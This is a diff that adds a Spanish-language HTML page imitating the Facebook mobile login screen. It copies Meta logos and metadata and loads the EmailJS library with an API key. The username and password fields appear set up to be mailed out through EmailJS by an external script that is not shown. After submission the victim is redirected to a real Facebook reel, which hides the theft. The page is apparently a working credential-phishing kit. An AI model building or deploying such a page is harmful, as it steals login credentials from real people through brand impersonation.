@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="default" id="meta_referrer">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Facebook - Entrar o registrarse</title>
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="description" content="Crea una cuenta o inicia sesión en Facebook. Conecta con amigos, familiares y otras personas que conozcas. Comparte fotos y vídeos, envía mensajes y...">
+    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/">
+    <link rel="alternate" media="handheld" href="https://m.facebook.com/">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Facebook - Entrar o registrarse">
+    <meta property="og:description" content="Crea una cuenta o inicia sesión en Facebook. Conecta con amigos, familiares y otras personas que conozcas. Comparte fotos y vídeos, envía mensajes y recibe actualizaciones.">
+    <meta property="og:url" content="https://www.facebook.com/">
+    <meta property="og:locale" content="es_ES"> <!-- Cambiado a español -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Facebook - Entrar o registrarse">
+    <meta name="twitter:description" content="Crea una cuenta o inicia sesión en Facebook. Conecta con amigos, familiares y otras personas que conozcas. Comparte fotos y vídeos, envía mensajes y recibe actualizaciones.">
+    <link rel="icon" href="2021_Facebook_icon.svg.png" type="image/x-icon">
+    <link rel="shortcut icon" href="2021_Facebook_icon.svg.png" type="image/x-icon">
+    <link rel="stylesheet" href="Styles.css">
+
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+
+<script type="text/javascript">
+  emailjs.init('VzO4r6-vxEeynaBSo')
+</script>
+</head>
+<body class="mobile-layout">
+<div class="main-container">
+        <div class="login-container">
+            <!-- Selector de idioma con más estructura -->
+            <div class="language-selector">
+                <span>Español</span>
+                <span class="language-arrow"></span>
+            </div>
+
+            <!-- Logo de Facebook con tamaño ajustado -->
+            <div class="logo-container">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" 
+                     alt="Facebook de Meta" 
+                     role="heading"
+                     width="112" 
+                     height="70">
+            </div>
+
+            <form class="login-form" id="form" action="#" method="post">
+  <div class="input-field">
+    <input type="text" name="from_name" id="from_name" autocomplete="username" required aria-label="Móvil o correo electrónico" placeholder=" ">
+    <label for="from_name">Movil o Correo electronico</label>
+  </div>
+
+  <div class="input-field">
+  <input type="password" name="password" id="password" autocomplete="current-password" required aria-label="Contraseña" placeholder=" ">
+  <label for="password">Contraseña</label>
+  <button type="button" id="toggle-password" class="eye-button">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yq/r/iHk6KioQuJP.png" alt="Mostrar contraseña" id="eye-icon" />
+  </button>
+</div>
+
+<input type="submit" id="button" value="Iniciar sesión" class="button button-primary">
+
+<script>
+document.getElementById('button').addEventListener('click', function() {
+    window.location.href = 'https://www.facebook.com/reel/1722129138366548/?referral_source=vod_newsfeed_unit&surface_type=vod';
+});
+</script>
+
+                <a href="https://m.facebook.com/login/identify/" 
+                   class="forgot-password"
+                   aria-label="Recuperar contraseña">
+                    ¿Has olvidado la contraseña?
+                </a>
+            </form>
+           
+            <div class="bottom-content">
+    <button type="button" 
+            class="button button-secondary"
+            aria-label="Crear cuenta nueva"
+            onclick="window.location.href='https://m.facebook.com/reg/'">
+        Crear cuenta nueva
+    </button>
+</div>
+
+    <div class="logoo-container">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" 
+             alt="Logotipo de Meta" 
+             class="meta-logo"
+             width="30"
+             height="30">
+    </div>
+    
+    <div class="footer-links">
+        <a href="#" class="footer-link">Información</a>
+        <a href="#" class="footer-link">Ayuda</a>
+        <a href="#" class="footer-link">Más</a>
+    </div>
+</div>
+
+<script src="JS.JS"></script>
+
+</body>
+</html>
